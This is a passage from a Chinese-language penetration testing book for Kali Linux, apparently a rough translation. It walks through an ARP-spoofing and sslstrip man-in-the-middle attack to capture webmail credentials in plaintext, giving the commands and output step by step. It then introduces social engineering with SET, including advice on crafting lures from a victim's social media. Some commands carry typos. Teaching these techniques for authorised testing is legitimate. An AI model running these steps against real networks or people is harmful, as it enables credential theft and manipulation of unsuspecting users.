
```bash
root@kali:-# ifdown eth0
Internet Systems Consortium DHCP Client 4.2.2
Copyright 2004-2011 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/
Listening on LPF/eth0:00:0c:29:49:73
Sending on LPF/eth0:00:0c:29:49:73
Sending on Socket/fallback
DHCPRELEASE on eth0 to 172.16.76.254 port 67
Reloading /etc/samba/smbd.conf: smbd only.
```

为了运行 SSL strip，你需要两个信息。首先，你需要目标主机的 IP 地址。其次，你需要网关的 IP 地址。执行此操作执行以下操作：

```bash
root@kali:-# route -n
Kernel IP table
Destination     Gateway         Genmask         Flags Metric Iface
0.0.0.0         172.16.76.254    0.0.0.0         UG    100    eth0
172.16.76.0     0.0.0.0         255.255.255.0   U     0      0 eth0
```

## 开始攻击

在我们开始收集用户凭据等信息之前，我们需要完成一些任务。我们需要启动允许我们重定向流量的设施。此外，我们需要启用 IP 转发和 arspoof。

启用 IP 转发：

```bash
echo 1 > /proc/sys/ipv4/ip_forward
```

```bash
root@kali:~# echo 1 > /proc/sys/ipv4/ip_forward
```

为了本示例，我们需要知道受者的 IP。这是为了避免整个网络的冲突和 ARP 地址风暴。在真实的攻击场景中，理想是对整个二层段运行 arspoof（如果省略受害者 IP，则是默认设置）。命令是：

```bash
arspoof -i eth0 -t victimip default_gateway_ip
```

### 第3章

```
root@kali: -- 
root@kali:~# iptables -t nat -A PREROUTING -p tcp --destination-port 80 --to-ports 10000
root@kali:~# 
```

要禁用 PREROUTING 规则，请将 `-A` 替换为 `-D` 以清除所有表规则。

`iptables -t nat -F` # 用于刷新 `flush`

`iptables -t nat -L` # 用于检查

`arpspoof` 有许多选项。你可以使用命令 `man iptables` 来查看更多选项。

现在，你已经准备就绪，可以开始使用 SSL strip 进行去捕获了！

启动 `sslstrip`，并在新打开的命令行窗口中运行以下命令以在 TCP 端口 `10000` 上启动 SSL strip 监听：

```
sslstrip -l 10000
```

```
root@kali:~# sslstrip -l 10000
sslstrip 0.9 by Moxie Marlinspike running...
```

### 服务端攻击

从目标主机上，访问在线邮件服务，例如 `https://www.hotmail.com` 并登录。

![](img/df1fdcde66c92c1fef83bd651dd5ffe3_143_0.png)

使用应用程序菜单快捷方式进入 SSLStrip 目录，打开另一个终端窗口并输入以下命令：

```
root@kali:~# tail -n 50 -f sslstrip.log
```

现在这里应该会显示 SSL strip 攻击的结果。

### 第3章

注意，在以下示例中，用户名和密码已被模糊处理，但它们应该以明文形式出现在你的屏幕上。

![](img/df1fdcde66c92c1fef83bd651dd5ffe3_144_0.png)

### 总结

本章解释了使用 Kali 中提供的工具攻破漏洞 Web 服务器的各种方法。最常用的方法是使用自动化工具识别已知漏洞，并利用最佳路径获取对目标系统的访问权限。

本章开始关注用于识别漏洞的各种工具。接下来的主题涵盖了用于利用常见服务器以及托管电子邮件服务器上漏洞的工具。接着，我们关注了暴力破解工具，这些工具可以从不受受已知漏洞利用的系统中收集数据。最后我们触及了密码破解和中间人攻击；然而，这些主题将在后面的章节中进行讨论。

下一章将重点关注识别和利用主机系统（也称为客户端设备）上的漏洞。

## 客户端攻击

客户端 `client` 或主机 `host` 一术是指用于连接到网络的端点，例如计算机、平板电脑或移动设备。客户端可以向其他客户端提供信息、服务和应用程序，或从另一个系统（如服务器）获取信息。通常，“客户端”一词指的是人们使用的端点。涉及这些意味着这些系统上存在一系列可能的漏洞，以及这些系统是否可以作为获取 Web 应用程序或信息的手段。本章的重点将是识别访问 Web 应用程序的系统、评估系统的漏洞，并在可能的情况下利用这些漏洞。本章将重点关注攻破密码，因为这是保护主机系统最常用的方法。

本章将通过介绍如何使用社会工程学攻击主机开始。随后，我们将查看如何识别主机系统上的漏洞，以便你使用书中其他章节介绍的工具来利用这些漏洞。我们将以攻击密码结束，因为它是保护主机系统最常见的手段。

### 社会工程学

对于目标的安全态势而言，人类永远是你最薄弱的环节。你越试图控制终端用户，他们就越尝试绕过策略。你实施的控制越少，策略被遵守的可能性就越低。这在决定如何保护终端用户免受网络威胁时形成了一把双刃剑。黑客知道这一点，并以各种方式针对终端用户，重点在于攻破普通用户的核心特征——**信任**。

社会工程学是操纵他人执行泄露信息行为的艺术。许多客户端攻击基于欺骗终端用户使其系统暴露在攻击之下。社会工程学的范围涵盖了假装成授权员工给某人打电话，到在 Facebook 上发布一个声称是服务但实际上是攻破客户端手段的链接。

发起成功的社会工程学攻击的良好实践是花时间了解你的目标；学习用户如何交流，并尝试融入他们的环境。大多数失败的社会工程学攻击都是由于以通用的格式编写的，而且它们没有包含吸引受害者的强力钩子 `hook`，就像一封编写糟糕的邮件，声称用户权获得未领取的资金。使用 Facebook 等社交媒体来源是了解目标的绝佳方法，可以了解目标青好的爱好和说话模式。例如，如果一个目标的 Facebook 个人资料布满了运动队标志，那么开发基于折扣运动票的陷阱将是理想的。

由于大多数客户端攻击都利用了社会工程学，下一节将探索 Kali 中常用的社会工程学工具。

### 社会工程学工具包 SET

社会工程学工具包 `SET` 由 TrustedSec 的创始人创建并编写。它是一个由 Python 驱动的开源工具，旨在通过社会工程学进行渗透测试。`SET` 是安全专业人员用于测试组织安全态势的极其流行的工具。现实中的攻击者使用 `SET` 构建主动和恶意的攻击。它是最常见的社会工程学攻击的首选工具。

要启动 `SET`，转到菜单栏 Exploitation Tools 利用工具 | Social Engineering Tools 社会工程学工具，并选择 `se-toolkit`。

当你第一次在 Kali 上启动 `SET` 时，`SET` 将直接从 GitHub 显示 `SET` 分发版更新。你将获得接收更新的选项。当你第一次在 Kali 上启动 `SET` 时，`SET` 将直接从 GitHub 显示 `SET` 分发版更新。你将获得接收更新的选项。选择 `yes` 接收更新。

### 第4章

![](img/df1fdcde66c92c1fef83bd651dd5ffe3_148_0.png)

重要通知！社会工程学工具包对 Kali 和 FSH Linux 的目录结构进行了重大更改。

所有 `SET` 动态信息现在将保存在 `~/.set` 目录中，而不是 `src/program_junk`。

`[I]` 请注意，以后你应该使用 `se-toolkit`。

`[I]` 通过输入 '`set`' 启动 `SET` 将消失...

`[I]` 如果在 Kali 上，可以在任何地方输入 '`se-toolkit`'...

`[I]` 如果不在 Kali 上，运行 `python setup.py` 然后你就可以任何地方使用 `se-toolkit`..

按 `{return}` 继续进入 `SET`。
